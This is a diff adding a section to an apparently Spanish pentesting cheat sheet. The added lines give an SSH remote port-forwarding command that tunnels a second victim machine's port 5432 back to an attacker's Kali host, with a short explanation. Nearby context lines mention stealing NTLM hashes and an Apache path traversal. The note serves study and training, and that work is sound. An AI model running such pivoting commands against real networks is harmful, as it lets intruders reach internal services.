@@ -384,6 +384,12 @@ Obtener hash NTLM desde un formulario de carga de archivos:
 
   Y ejecutar comandos a través de proxychains.
 
+  SSH Remote Port Fordwarding
+
+    ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
+
+  El puerto 2345 de la máquina víctima 1 es ahora el puerto 5432 de la máquina victima 2 '10.4.50.215'. Todo eso nos lo llevamos a nuestro kali de ataque con la última parte del comando 'kali@192.168.118.4'
+
 ## Vulnerabilidades conocidas
 
 Apache HTTP Server 2.4.49 - Path traversal
